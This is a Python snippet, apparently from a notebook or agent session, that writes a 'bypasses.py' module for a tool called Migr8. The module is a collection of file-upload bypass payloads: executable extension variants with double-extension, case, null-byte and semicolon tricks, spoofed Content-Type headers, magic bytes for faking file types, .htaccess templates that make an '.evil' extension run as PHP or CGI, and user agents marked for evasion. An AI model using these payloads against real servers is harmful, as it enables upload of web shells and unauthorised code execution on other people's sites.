# Create the bypasses.py utility - fixed version
bypasses_code = '''"""
Bypasses utility for Migr8 framework
Contains lists of common file extensions and content types for upload bypass attempts
"""

# Common file extensions for upload bypass attempts
BYPASS_EXTENSIONS = [
    # PHP variants
    '.php', '.php3', '.php4', '.php5', '.php7', '.phtml', '.phar',
    '.inc', '.phps', '.php.bak', '.php.old', '.php.tmp',
    
    # ASP/ASPX variants  
    '.asp', '.aspx', '.asa', '.asax', '.ascx', '.ashx', '.asmx',
    '.asp.bak', '.aspx.old',
    
    # JSP variants
    '.jsp', '.jspx', '.jsw', '.jsv', '.jspf',
    
    # Server-side includes
    '.shtml', '.shtm', '.stm',
    
    # Cold Fusion
    '.cfm', '.cfml', '.cfc',
    
    # Perl/CGI
    '.pl', '.cgi', '.pm',
    
    # Python
    '.py', '.pyc', '.pyo', '.pyw',
    
    # Double extensions
    '.php.jpg', '.php.png', '.php.gif', '.php.txt', '.php.pdf',
    '.aspx.jpg', '.aspx.png', '.aspx.gif', '.aspx.txt',
    
    # Case variations
    '.PHP', '.PhP', '.pHp', '.ASPX', '.AsPx', '.aSp',
    
    # Null byte (historical)
    '.php%00.jpg', '.php\\\\x00.jpg', '.aspx%00.png',
    
    # Special characters
    '.php.', '.php..', '.php;.jpg', '.php:.jpg'
]

# Content-Type headers for bypass attempts
BYPASS_CONTENT_TYPES = [
    # Images
    'image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/bmp',
    'image/tiff', 'image/webp', 'image/svg+xml',
    
    # Documents
    'application/pdf', 'application/msword', 'application/vnd.ms-excel',
    'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    'text/plain', 'text/csv', 'text/rtf',
    
    # Archives
    'application/zip', 'application/x-rar-compressed', 'application/x-7z-compressed',
    'application/x-tar', 'application/gzip',
    
    # Media
    'audio/mpeg', 'audio/wav', 'video/mp4', 'video/avi', 'video/quicktime',
    
    # XML/JSON
    'application/xml', 'text/xml', 'application/json',
    
    # Generic
    'application/octet-stream', 'multipart/form-data'
]

# Magic bytes for file type spoofing
MAGIC_BYTES = {
    'PDF': b'%PDF-1.',
    'JPEG': b'\\\\xff\\\\xd8\\\\xff',
    'PNG': b'\\\\x89\\\\x50\\\\x4e\\\\x47\\\\x0d\\\\x0a\\\\x1a\\\\x0a',
    'GIF87a': b'GIF87a',
    'GIF89a': b'GIF89a',
    'ZIP': b'PK\\\\x03\\\\x04',
    'DOC': b'\\\\xd0\\\\xcf\\\\x11\\\\xe0\\\\xa1\\\\xb1\\\\x1a\\\\xe1'
}

# .htaccess templates for bypass attempts
HTACCESS_TEMPLATES = [
    # Basic PHP execution
    "AddType application/x-httpd-php .evil\\nAddHandler application/x-httpd-php .evil",
    
    # Alternative handler
    "AddHandler php5-script .evil\\nAddType text/html .evil",
    
    # Multiple extensions
    "AddType application/x-httpd-php .evil .rogue .bad\\nAddHandler application/x-httpd-php .evil",
    
    # CGI execution
    "Options +ExecCGI\\nAddHandler cgi-script .evil",
    
    # Server-side includes
    "Options +Includes\\nAddType text/html .evil\\nAddHandler server-parsed .evil",
    
    # Rewrite rules
    "RewriteEngine On\\nRewriteRule ^(.+)\\\\.evil$ $1.php [L]"
]

# Common upload form field names
UPLOAD_FIELD_NAMES = [
    'file', 'upload', 'userfile', 'attachment', 'document',
    'image', 'photo', 'avatar', 'profile_pic', 'logo',
    'resume', 'cv', 'report', 'data', 'import',
    'files[]', 'uploads[]', 'attachments[]'
]

# User agents for evasion
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
]
'''

with open("migr8/utils/bypasses.py", 'w') as f:
    f.write(bypasses_code)
print("Created: migr8/utils/bypasses.py")